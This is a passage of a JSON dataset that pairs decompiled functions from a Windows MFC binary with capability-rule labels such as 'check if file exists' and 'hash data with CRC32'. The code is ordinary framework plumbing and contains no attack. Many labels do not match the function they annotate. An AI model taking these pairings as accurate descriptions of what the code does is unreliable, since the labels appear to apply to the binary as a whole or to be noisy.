        "decompiled_code": "\nvoid __cdecl fcn.00449173(uint arg_8h, uint *arg_ch)\n\n{\n    uint *puVar1;\n    int32_t *in_ECX;\n    int32_t iVar2;\n    uint *puVar3;\n    uint var_34h;\n    int32_t var_14h;\n    uint *var_10h;\n    uint var_4h;\n    \n    puVar1 = arg_ch;\n    puVar3 = &var_34h;\n    for (iVar2 = 0xc; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = *puVar1;\n        puVar1 = puVar1 + 1;\n        puVar3 = puVar3 + 1;\n    }\n    if (((var_14h == 0) && (var_10h != 0xffffffff)) && (var_10h != NULL)) {\n        iVar2 = fcn.004346d9(var_10h, &var_4h);\n        if (iVar2 == 0) {\n            puVar1 = fcn.004348d2(var_10h);\n            *puVar1 = 0;\n        }\n        arg_ch = NULL;\n        fcn.00434700(var_10h, &arg_ch);\n        var_10h = arg_ch;\n    }\n    (**(*in_ECX + 0x110))(0x404, arg_8h, &var_34h);\n    return;\n}\n",
        "token_count": 322
    },
    "0044bf7a": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044bf7a(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t in_ECX;\n    int32_t iVar4;\n    \n    iVar1 = arg_8h;\n    iVar4 = 0;\n    if (-1 < arg_8h) goto code_r0x0044bf90;\n    do {\n        fcn.00411e42();\ncode_r0x0044bf90:\n        if (iVar4 <= arg_ch) {\n            *(in_ECX + 0x10) = arg_ch;\n        }\n        if (iVar1 == iVar4) {\n            fcn.004115a4(*(in_ECX + 4));\n            *(in_ECX + 0xc) = iVar4;\n            *(in_ECX + 8) = iVar4;\n            goto code_r0x0044c080;\n        }\n        if (*(in_ECX + 4) == iVar4) {\n            uVar2 = fcn.00411579(iVar1);\n            *(in_ECX + 4) = uVar2;\n            fcn.00462290(uVar2, iVar4, iVar1);\n            *(in_ECX + 0xc) = iVar1;\ncode_r0x0044bff7:\n            *(in_ECX + 8) = iVar1;\n            return;\n        }\n        iVar4 = *(in_ECX + 0xc);\n        if (iVar1 <= iVar4) {\n            iVar4 = *(in_ECX + 8);\n            if (iVar4 < iVar1) {\n                fcn.00462290(iVar4 + *(in_ECX + 4), 0, iVar1 - iVar4);\n            }\n            goto code_r0x0044bff7;\n        }\n        iVar3 = *(in_ECX + 0x10);\n        if (iVar3 == 0) {\n            iVar3 = *(in_ECX + 8) + (*(in_ECX + 8) >> 0x1f & 7U) >> 3;\n            if (iVar3 < 4) {\ncode_r0x0044c029:\n                iVar3 = 4;\n            }\n            else if (iVar3 < 0x401) {\n                if (iVar3 < 4) goto code_r0x0044c029;\n            }\n            else {\n                iVar3 = 0x400;\n            }\n        }\n        arg_8h = iVar3 + iVar4;\n        if (iVar3 + iVar4 <= iVar1) {\n            arg_8h = iVar1;\n        }\n    } while (arg_8h < iVar4);\n    iVar4 = fcn.00411579(arg_8h);\n    fcn.0041314e(iVar4, arg_8h, *(in_ECX + 4), *(in_ECX + 8));\n    fcn.00462290(*(in_ECX + 8) + iVar4, 0, iVar1 - *(in_ECX + 8));\n    fcn.004115a4(*(in_ECX + 4));\n    *(in_ECX + 8) = iVar1;\n    *(in_ECX + 0xc) = arg_8h;\ncode_r0x0044c080:\n    *(in_ECX + 4) = iVar4;\n    return;\n}\n",
        "token_count": 741
    },
    "0044d277": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0044d277(int32_t arg_8h, uint *arg_ch, int32_t arg_10h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t *in_ECX;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar2 = arg_8h;\n    if (in_ECX != NULL) goto code_r0x0044d28d;\n    do {\n        fcn.00411e42();\ncode_r0x0044d28d:\n    } while ((arg_ch == NULL) || (arg_8h == 0));\n    if ((in_ECX[9] != 0) && (in_ECX[10] != 0)) {\n        if (arg_10h == -1) {\n            arg_10h = in_ECX[0xc];\n        }\n        var_30h = *arg_ch;\n        var_2ch = arg_ch[1];\n        var_28h = arg_ch[2];\n        var_24h = arg_ch[3];\n        fcn.0044ce6b(&var_8h);\n        fcn.0042d8d4(&var_10h);\n        piVar1 = arg_8h + 0xc;\n        var_20h = var_8h;\n        var_1ch = var_4h;\n        var_18h = var_10h;\n        var_14h = var_ch;\n        arg_ch = NULL;\n        arg_8h = 0;\n        if ((*piVar1 != 0) && (*(in_ECX[8] + 0x88) != 0)) {\n            arg_8h = *(iVar2 + 8);\n            arg_ch = *(in_ECX[8] + 0x88);\n        }\n        iVar3 = (**(*in_ECX[10] + 0xc))\n                          (in_ECX[10], arg_10h, 0xffffffff, 0, arg_ch, arg_8h, *(iVar2 + 4), &var_30h, &var_20h, 0, 0);\n        if ((arg_ch != NULL) && (iVar3 == -0x7ffbfff9)) {\n            iVar3 = (**(*in_ECX[10] + 0xc))\n                              (in_ECX[10], arg_10h, 0xffffffff, 0, 0, 0, *(iVar2 + 4), &var_30h, &var_20h, 0, 0);\n        }\n        if ((iVar3 == 0) || (iVar3 != -0x7ffbfff9)) {\n            (**(*in_ECX + 200))(iVar3);\n            return 1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 690
    },
    "0045354b": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045354b(int32_t param_1)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint lpMsg;\n    uint lpPoint;\n    uint var_14h;\n    int32_t *var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    if (((*(param_1 + 0x68) != 1) && (iVar3 = fcn.004531e7(),  iVar3 != 0)) &&\n       (iVar3 = (*_sym.imp.USER32.dll_PeekMessageA)(&lpMsg, *(param_1 + 0x20), 0x367, 0x367, 3),  iVar3 == 0)) {\n        var_ch = *(param_1 + 0x68);\n        *(param_1 + 0x68) = 1;\n        if (var_ch != 2) {\n            piVar1 = *(param_1 + 0x80);\n            if ((piVar1 != NULL) && (iVar3 = (**(*piVar1 + 0x60))(1),  iVar3 == 0)) {\n                (**(**(param_1 + 0x80) + 0x60))(0);\n                *(param_1 + 0x68) = 0;\n                return;\n            }\n        }\n        if (var_ch == 0) {\n            (*_sym.imp.USER32.dll_PostMessageA)(*(param_1 + 0x20), 0x111, 0xe145);\n            *(param_1 + 0x68) = 2;\n        }\n        else {\n            var_ch = (*_sym.imp.USER32.dll_SendMessageA)(*(param_1 + 0x20), 0x362, 0xe002, 0);\n            if (var_ch == 0) {\n                var_ch = 0xe001;\n            }\n            var_8h = 0;\n            (*_sym.imp.USER32.dll_GetCursorPos)(&lpPoint);\n            fcn.00453241(lpPoint, var_14h, 0);\n            var_4h = 0;\n            iVar3 = fcn.0043026e();\n            piVar1 = *(iVar3 + 4);\n            var_10h = piVar1;\n            do {\n                while( true ) {\n                    if (*(param_1 + 0x68) == 0) goto code_r0x0045367b;\n                    iVar3 = (*_sym.imp.USER32.dll_PeekMessageA)(&lpMsg, 0, 0, 0, 0);\n                    if (iVar3 != 0) break;\n                    iVar3 = (**(*piVar1 + 0x60))(var_4h);\n                    var_4h = var_4h + 1;\n                    if (iVar3 == 0) {\n                        var_4h = 0;\n                        (*_sym.imp.USER32.dll_WaitMessage)();\n                    }\n                }\n                iVar3 = fcn.00453350(&lpMsg, &var_8h);\n            } while (iVar3 != 0);\ncode_r0x0045367b:\n            pcVar2 = _sym.imp.USER32.dll_ReleaseCapture;\n            *(param_1 + 0x68) = 0;\n            (*pcVar2)();\n            uVar4 = (*_sym.imp.USER32.dll_SetCapture)(*(param_1 + 0x20));\n            fcn.004185c5(uVar4);\n            (*pcVar2)();\n            pcVar2 = _sym.imp.USER32.dll_SendMessageA;\n            (*_sym.imp.USER32.dll_SendMessageA)(*(param_1 + 0x20), 0x362, var_ch, 0);\n            if (*(param_1 + 0x80) != NULL) {\n                (**(**(param_1 + 0x80) + 0x60))(0);\n            }\n            if (var_8h != 0) {\n                if (var_8h == -1) {\n                    (*pcVar2)(*(param_1 + 0x20), 0x111, 0xe147, 0);\n                }\n                else {\n                    (**(*var_10h + 0xac))(var_8h, 1);\n                }\n            }\n            (*_sym.imp.USER32.dll_PostMessageA)(*(param_1 + 0x20), 0x36a, 0, 0);\n        }\n    }\n    return;\n}\n",
        "token_count": 1007
    },
    "00453b31": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint16_t * __cdecl fcn.00453b31(int16_t *arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t *arg_8h_00;\n    int16_t *piVar4;\n    int32_t *arg_ch_00;\n    int32_t in_ECX;\n    int16_t *var_ch;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    var_ch = NULL;\n    var_8h = 0;\n    if (*(in_ECX + 0x28) != 0) {\n        var_4h = 0;\n        do {\n            piVar4 = *(in_ECX + 0x20) + var_4h;\n            if ((*piVar4 == *arg_8h) && ((*(arg_8h + 8) & *(piVar4 + 8)) != 0)) {\n                iVar1 = *(piVar4 + 4);\n                if ((iVar1 != 2) && ((iVar1 != 4 && (*(piVar4 + 10) != 0)))) {\n                    iVar2 = *(piVar4 + 6);\n                    iVar3 = *(arg_8h + 6);\n                    if ((iVar2 != iVar3) && (((iVar2 != 0 || (iVar3 != -1)) && ((iVar2 != -1 || (iVar3 != 0))))))\n                    goto code_r0x00453bd2;\n                }\n                if ((iVar1 == *(arg_8h + 4)) && (*(piVar4 + 0x10) == arg_ch)) {\n                    arg_ch_00 = *(arg_8h + 2);\n                    arg_8h_00 = *(piVar4 + 2);\n                    var_ch = piVar4;\n                    if (arg_8h_00 != NULL) {\n                        if ((arg_ch_00 == NULL) || (*arg_8h_00 != *arg_ch_00)) goto code_r0x00453bd2;\n                        arg_ch_00 = fcn.00460c0e(arg_8h_00, arg_ch_00, *arg_8h_00);\n                    }\n                    if (arg_ch_00 == NULL) {\n                        return piVar4;\n                    }\n                }\n            }\ncode_r0x00453bd2:\n            var_8h = var_8h + 1;\n            var_4h = var_4h + 0x24;\n        } while (var_8h < *(in_ECX + 0x28));\n    }\n    return var_ch;\n}\n",
        "token_count": 583
    },
    "0045999d": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0045999d(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    if (*(param_1 + 0x80) == 0) {\n        iVar1 = fcn.00431b02(*(param_1 + 0x24), 0x4a1228);\n        *(param_1 + 0x80) = iVar1;\n        if (iVar1 == 0) {\n            iVar1 = (*_sym.imp.ole32.dll_OleRun)(*(param_1 + 0x24));\n            if (iVar1 < 0) {\n                *(param_1 + 0x80) = 0xffffffff;\n            }\n            else {\n                uVar2 = fcn.00431b02(*(param_1 + 0x24), 0x4a1228);\n                *(param_1 + 0x80) = uVar2;\n            }\n        }\n    }\n    if ((*(param_1 + 0x80) != 0) && (*(param_1 + 0x80) != -1)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 259
    },
    "0045c9da": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: lplpsz\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid __cdecl\nfcn.0045c9da(uint arg_8h, uint pszExeFileName, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h)\n\n{\n    char *pcVar1;\n    int32_t iVar2;\n    int32_t unaff_EBP;\n    uint lplpsz;\n    uint var_10h;\n    char *var_4h;\n    \n    fcn.004627af(8);\n    var_4h = unaff_EBP + -0x14;\n    (*_sym.imp.ole32.dll_StringFromCLSID)(*(unaff_EBP + 0xc), var_4h);\n    iVar2 = fcn.00431875(*(unaff_EBP + -0x14));\n    if (iVar2 == 0) goto code_r0x0045cbfd;\n    fcn.0045c640(0, iVar2);\n    fcn.0045c640(1, *(unaff_EBP + 0x10));\n    (*_sym.imp.ole32.dll_CoTaskMemFree)(iVar2);\n    fcn.0042407a();\n    fcn.0040f840();\n    *(unaff_EBP + -4) = 0;\n    iVar2 = fcn.0043026e();\n    fcn.0043ffa8(*(iVar2 + 8), unaff_EBP + -0x10);\n    fcn.0045c640();\n    fcn.0045c640();\n    fcn.0045c640();\n    fcn.0043026e();\n    fcn.0045c640();\n    fcn.0042407a();\n    fcn.0040f840();\n    *(unaff_EBP + -4) = 1;\n    if (*(unaff_EBP + 0x1c) != 0) {\n        *(unaff_EBP + 0xc) = *(unaff_EBP + -0x10);\n        fcn.0043026e();\n        iVar2 = (*_sym.imp.SHELL32.dll_ExtractIconA)();\n        if (iVar2 != 0) {\n            (*_sym.imp.USER32.dll_DestroyIcon)();\n        }\n    }\n    fcn.0041a435();\n    fcn.0045c640();\n    fcn.0045c640();\n    fcn.0042407a();\n    fcn.0040f840();\n    pcVar1 = *(unaff_EBP + 0x24);\n    *(unaff_EBP + -4) = 2;\n    if ((pcVar1 == NULL) || (*pcVar1 == '\\0')) {\n        fcn.00413a3a();\n        iVar2 = fcn.0043e2a5();\n        if (iVar2 != -1) {\n            fcn.0043e528(unaff_EBP + 0x20, iVar2 + 1);\n            *(unaff_EBP + -4) = 3;\n            fcn.0041d369();\n            *(unaff_EBP + -4) = 2;\n            fcn.00402740();\n            iVar2 = fcn.0043e2a5();\n            if (iVar2 != -1) {\n                fcn.0043e528(unaff_EBP + 0x20, iVar2);\n                *(unaff_EBP + -4) = 4;\n                fcn.0041d369();\n                *(unaff_EBP + -4) = 2;\n                fcn.00402740();\n                iVar2 = fcn.0043e2a5();\n                if (iVar2 != -1) {\n                    var_4h = fcn.0043e4af(unaff_EBP + 0x20, iVar2);\n                    *(unaff_EBP + -4) = 5;\n                    fcn.0041d369(var_4h);\n                    fcn.00402740();\n                    goto code_r0x0045cbd2;\n                }\n            }\n        }\n        fcn.0041372f();\n    }\n    else {\n        fcn.00413a3a();\n        var_4h = pcVar1;\n    }\ncode_r0x0045cbd2:\n    fcn.0045c640(8, *(unaff_EBP + 0xc), var_4h);\n    fcn.00402740();\n    fcn.00402740();\n    fcn.00402740();\ncode_r0x0045cbfd:\n    fcn.00462887();\n    return;\n}\n",
        "token_count": 1049
    },
    "0045cf34": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint fcn.0045cf34(int32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    if (**(param_1 + 8) == -1) {\n        for (iVar1 = *(param_1 + 4); *(iVar1 + 0x18) != -1; iVar1 = iVar1 + 0x20) {\n        }\n        **(param_1 + 8) = iVar1 - *(param_1 + 4) >> 5;\n    }\n    return **(param_1 + 8);\n}\n",
        "token_count": 122
    },
    "0045d228": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0045d228(uint *arg_8h, uint arg_ch)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint *puVar4;\n    int32_t var_4h;\n    \n    var_4h = 0;\n    do {\n        if (arg_8h == NULL) {\n            return 0xffffffff;\n        }\n        puVar4 = arg_8h[1];\n        uVar1 = fcn.0045cf34();\n        uVar3 = 0;\n        if (uVar1 != 0) {\n            do {\n                if ((*(puVar4 + 3) != 0xfff) && (iVar2 = fcn.00416df1(*puVar4, arg_ch),  iVar2 == 0)) {\n                    if (puVar4[1] != 0xffffffff) {\n                        return puVar4[1];\n                    }\n                    return var_4h << 0x10 | uVar3 + 1 & 0xffff;\n                }\n                puVar4 = puVar4 + 8;\n                uVar3 = uVar3 + 1;\n            } while (uVar3 < uVar1);\n        }\n        arg_8h = *arg_8h;\n        var_4h = var_4h + 1;\n    } while( true );\n}\n",
        "token_count": 308
    },
    "0045d295": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0045d295(int32_t *arg_8h, uint32_t arg_ch)\n\n{\n    uint *arg_8h_00;\n    uint *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    bool bVar5;\n    \n    arg_8h_00 = (**(*arg_8h + 0x30))();\n    bVar5 = arg_ch == 0;\n    puVar4 = arg_8h_00;\n    if (bVar5) {\n        for (; puVar4 != NULL; puVar4 = *puVar4) {\n            for (puVar1 = puVar4[1]; puVar1[6] != -1; puVar1 = puVar1 + 8) {\n                if (*(puVar1 + 3) == 0xfff) {\n                    arg_ch = puVar1[1];\n                    if ((arg_ch == 0xffffffff) && (arg_ch = fcn.0045d228(arg_8h_00, *puVar1),  arg_ch == 0xffffffff)) {\n                        return 0;\n                    }\n                    bVar5 = arg_ch == 0;\n                    goto code_r0x0045d2ec;\n                }\n            }\n        }\n    }\n    else {\ncode_r0x0045d2ec:\n        if ((!bVar5 && -1 < arg_ch) && (uVar2 = 0,  arg_8h_00 != NULL)) {\n            puVar4 = arg_8h_00;\n            do {\n                if (arg_ch >> 0x10 <= uVar2) break;\n                puVar4 = *puVar4;\n                uVar2 = uVar2 + 1;\n            } while (puVar4 != NULL);\n            if (puVar4 != NULL) {\n                uVar2 = fcn.0045cf34(puVar4);\n                if ((arg_ch & 0xffff) <= uVar2) {\n                    iVar3 = puVar4[1] + ((arg_ch & 0xffff) * 8 + -8) * 4;\n                    if (*(iVar3 + 4) == 0xffffffff) {\n                        return iVar3;\n                    }\n                    if (*(iVar3 + 4) == arg_ch) {\n                        return iVar3;\n                    }\n                }\n            }\n        }\n    }\n    do {\n        if (arg_8h_00 == NULL) {\n            return 0;\n        }\n        for (iVar3 = arg_8h_00[1]; *(iVar3 + 0x18) != -1; iVar3 = iVar3 + 0x20) {\n            if (*(iVar3 + 4) == arg_ch) {\n                return iVar3;\n            }\n        }\n        arg_8h_00 = *arg_8h_00;\n    } while( true );\n}\n",
        "token_count": 631
    },
    "0045e3e2": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __thiscall fcn.0045e3e2(int32_t param_1, int32_t param_2, uint *param_3)\n\n{\n    uint uVar1;\n    \n    if ((*(param_1 + 4) == -1) || (*(param_1 + 4) != param_2)) {\n        *param_3 = 0;\n        uVar1 = 0;\n    }\n    else {\n        *param_3 = *(param_1 + 8);\n        (**(**(param_1 + 8) + 4))(*(param_1 + 8));\n        uVar1 = 1;\n    }\n    return uVar1;\n}\n",
        "token_count": 148
    },
    "0045e57e": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __thiscall fcn.0045e57e(int32_t param_1, int32_t param_2, uint param_3, uint *param_4)\n\n{\n    int32_t iVar1;\n    \n    if ((((*(param_1 + 4) != -1) && (*(param_1 + 4) == param_2)) && (*(param_1 + 0x1c) != 0)) &&\n       (iVar1 = fcn.004115b3(param_1 + 0xc, param_3),  iVar1 != 0)) {\n        *param_4 = *(param_1 + 0x1c);\n        (**(**(param_1 + 0x1c) + 4))(*(param_1 + 0x1c));\n        return 1;\n    }\n    *param_4 = 0;\n    return 0;\n}\n",
        "token_count": 193
    },
    "004102e0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.004102e0(int32_t param_1)\n\n{\n    uint32_t uVar1;\n    ushort unaff_SI;\n    \n    if ((~*(param_1 + 0x18) & 1) == 0) {\n        fcn.004299a5(2, *(param_1 + 0x14));\n    }\n    uVar1 = *(param_1 + 0x28) + 2;\n    if (*(param_1 + 0x2c) <= uVar1 && uVar1 != *(param_1 + 0x2c)) {\n        fcn.00429b78();\n    }\n    **(param_1 + 0x28) = unaff_SI;\n    *(param_1 + 0x28) = *(param_1 + 0x28) + 2;\n    return param_1;\n}\n",
        "token_count": 196
    },
    "00410320": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00410320(int32_t param_1)\n\n{\n    uint32_t uVar1;\n    uint unaff_ESI;\n    \n    if ((~*(param_1 + 0x18) & 1) == 0) {\n        fcn.004299a5(2, *(param_1 + 0x14));\n    }\n    uVar1 = *(param_1 + 0x28) + 4;\n    if (*(param_1 + 0x2c) <= uVar1 && uVar1 != *(param_1 + 0x2c)) {\n        fcn.00429b78();\n    }\n    **(param_1 + 0x28) = unaff_ESI;\n    *(param_1 + 0x28) = *(param_1 + 0x28) + 4;\n    return param_1;\n}\n",
        "token_count": 197
    },
    "00410360": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00410360(int32_t param_1)\n\n{\n    ushort *unaff_ESI;\n    \n    if ((*(param_1 + 0x18) & 1) == 0) {\n        fcn.004299a5(4, *(param_1 + 0x14));\n    }\n    if (*(param_1 + 0x2c) < *(param_1 + 0x28) + 2U) {\n        fcn.00429bef((*(param_1 + 0x28) - *(param_1 + 0x2c)) + 2);\n    }\n    *unaff_ESI = **(param_1 + 0x28);\n    *(param_1 + 0x28) = *(param_1 + 0x28) + 2;\n    return param_1;\n}\n",
        "token_count": 191
    },
    "004103b0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.004103b0(int32_t param_1)\n\n{\n    uint *unaff_ESI;\n    \n    if ((*(param_1 + 0x18) & 1) == 0) {\n        fcn.004299a5(4, *(param_1 + 0x14));\n    }\n    if (*(param_1 + 0x2c) < *(param_1 + 0x28) + 4U) {\n        fcn.00429bef((*(param_1 + 0x28) - *(param_1 + 0x2c)) + 4);\n    }\n    *unaff_ESI = **(param_1 + 0x28);\n    *(param_1 + 0x28) = *(param_1 + 0x28) + 4;\n    return param_1;\n}\n",
        "token_count": 192
    },
    "0041811b": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t __thiscall fcn.0041811b(int32_t *param_1, uint8_t param_2)\n\n{\n    bool bVar1;\n    bool bVar2;\n    code *pcVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t unaff_EBX;\n    uint8_t unaff_retaddr;\n    \n    bVar1 = true;\n    bVar2 = false;\n    if (((param_2 & 4) == 0) || (uVar4 = fcn.0041be35(),  (uVar4 & 0x10000000) != 0)) {\n        bVar1 = false;\n    }\n    iVar5 = (*_sym.imp.USER32.dll_GetParent)(param_1[8]);\n    param_1[0xf] = param_1[0xf] | 0x18;\n    iVar6 = fcn.0042692e();\n    pcVar3 = _sym.imp.USER32.dll_UpdateWindow;\ncode_r0x004181da:\n    while ((!bVar2 || (iVar7 = (*_sym.imp.USER32.dll_PeekMessageA)(iVar6, 0, 0, 0, 0),  iVar7 != 0))) {\n        do {\n            iVar7 = fcn.00426eda();\n            if (iVar7 == 0) {\n                fcn.00424e30(0);\n                return -1;\n            }\n            if ((bVar1) && ((*(iVar6 + 4) == 0x118 || (*(iVar6 + 4) == 0x104)))) {\n                fcn.0041bf7a(1);\n                (*pcVar3)(param_1[8]);\n                bVar1 = false;\n            }\n            iVar7 = (**(*param_1 + 0x80))();\n            if (iVar7 == 0) {\n                param_1[0xf] = param_1[0xf] & 0xffffffe7;\n                return param_1[0x11];\n            }\n            iVar7 = fcn.00426d6a(iVar6);\n            if (iVar7 != 0) {\n                bVar2 = true;\n                unaff_EBX = 0;\n            }\n            iVar7 = (*_sym.imp.USER32.dll_PeekMessageA)(iVar6, 0, 0, 0, 0);\n        } while (iVar7 != 0);\n    }\n    if (bVar1) {\n        fcn.0041bf7a(1);\n        (*pcVar3)(param_1[8]);\n        bVar1 = false;\n    }\n    if ((((unaff_retaddr & 1) == 0) && (iVar5 != 0)) && (unaff_EBX == 0)) {\n        (*_sym.imp.USER32.dll_SendMessageA)(iVar5, 0x121, 0, param_1[8]);\n    }\n    if ((unaff_retaddr & 2) == 0) goto code_r0x004181bb;\n    goto code_r0x004181d6;\ncode_r0x004181bb:\n    iVar7 = (*_sym.imp.USER32.dll_SendMessageA)(param_1[8], 0x36a, 0, unaff_EBX);\n    unaff_EBX = unaff_EBX + 1;\n    if (iVar7 == 0) {\ncode_r0x004181d6:\n        bVar2 = false;\n    }\n    goto code_r0x004181da;\n}\n",
        "token_count": 786
    },
    "0041b8ed": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nbool __cdecl fcn.0041b8ed(uint32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    bool bVar4;\n    uint32_t var_34h;\n    uint var_30h;\n    uint var_24h;\n    uint var_1ch;\n    uint var_18h;\n    char *var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = fcn.0043026e();\n    arg_8h = arg_8h & ~*(var_4h + 0x18);\n    if (arg_8h == 0) {\n        bVar4 = true;\n    }\n    else {\n        uVar3 = 0;\n        fcn.00462290(&var_34h, 0, 0x28);\n        var_30h = _sym.imp.USER32.dll_DefWindowProcA;\n        iVar1 = fcn.0043026e();\n        var_24h = *(iVar1 + 8);\n        var_1ch = *0x4bb618;\n        var_ch = 8;\n        if ((arg_8h & 1) != 0) {\n            var_34h = 0xb;\n            var_10h = \"AfxWnd80s\";\n            iVar1 = fcn.0041b606(&var_34h);\n            if (iVar1 != 0) {\n                uVar3 = 1;\n            }\n        }\n        if ((arg_8h & 0x20) != 0) {\n            var_34h = var_34h | 0x8b;\n            var_10h = \"AfxOleControl80s\";\n            iVar1 = fcn.0041b606(&var_34h);\n            if (iVar1 != 0) {\n                uVar3 = uVar3 | 0x20;\n            }\n        }\n        if ((arg_8h & 2) != 0) {\n            var_34h = 0;\n            var_10h = \"AfxControlBar80s\";\n            var_18h = 0x10;\n            iVar1 = fcn.0041b606(&var_34h);\n            if (iVar1 != 0) {\n                uVar3 = uVar3 | 2;\n            }\n        }\n        if ((arg_8h & 4) != 0) {\n            var_34h = 8;\n            var_18h = 0;\n            iVar1 = fcn.0041b8ac(&var_34h, \"AfxMDIFrame80s\", 0x7a01);\n            if (iVar1 != 0) {\n                uVar3 = uVar3 | 4;\n            }\n        }\n        if ((arg_8h & 8) != 0) {\n            var_34h = 0xb;\n            var_18h = 6;\n            iVar1 = fcn.0041b8ac(&var_34h, \"AfxFrameOrView80s\", 0x7a02);\n            if (iVar1 != 0) {\n                uVar3 = uVar3 | 8;\n            }\n        }\n        if ((arg_8h & 0x10) != 0) {\n            var_8h = 0xff;\n            uVar2 = fcn.00418d36(&var_ch, 0x3fc0);\n            uVar3 = uVar3 | uVar2;\n            arg_8h = arg_8h & 0xffffc03f;\n        }\n        if ((arg_8h & 0x40) != 0) {\n            var_8h = 0x10;\n            uVar2 = fcn.00418d36(&var_ch, 0x40);\n            uVar3 = uVar3 | uVar2;\n        }\n        if ((arg_8h & 0x80) != 0) {\n            var_8h = 2;\n            uVar2 = fcn.00418d36(&var_ch, 0x80);\n            uVar3 = uVar3 | uVar2;\n        }\n        if ((arg_8h & 0x100) != 0) {\n            var_8h = 8;\n            uVar2 = fcn.00418d36(&var_ch, 0x100);\n            uVar3 = uVar3 | uVar2;\n        }\n        if ((arg_8h & 0x200) != 0) {\n            var_8h = 0x20;\n            uVar2 = fcn.00418d36(&var_ch, 0x200);\n            uVar3 = uVar3 | uVar2;\n        }\n        if ((arg_8h & 0x400) != 0) {\n            var_8h = 1;\n            uVar2 = fcn.00418d36(&var_ch, 0x400);\n            uVar3 = uVar3 | uVar2;\n        }\n        if ((arg_8h & 0x800) != 0) {\n            var_8h = 0x40;\n            uVar2 = fcn.00418d36(&var_ch, 0x800);\n            uVar3 = uVar3 | uVar2;\n        }\n        if ((arg_8h & 0x1000) != 0) {\n            var_8h = 4;\n            uVar2 = fcn.00418d36(&var_ch, 0x1000);\n            uVar3 = uVar3 | uVar2;\n        }\n        if ((arg_8h & 0x2000) != 0) {\n            var_8h = 0x80;\n            uVar2 = fcn.00418d36(&var_ch, 0x2000);\n            uVar3 = uVar3 | uVar2;\n        }\n        if ((arg_8h & 0x4000) != 0) {\n            var_8h = 0x800;\n            uVar2 = fcn.00418d36(&var_ch, 0x4000);\n            uVar3 = uVar3 | uVar2;\n        }\n        if ((arg_8h & 0x8000) != 0) {\n            var_8h = 0x400;\n            uVar2 = fcn.00418d36(&var_ch, 0x8000);\n            uVar3 = uVar3 | 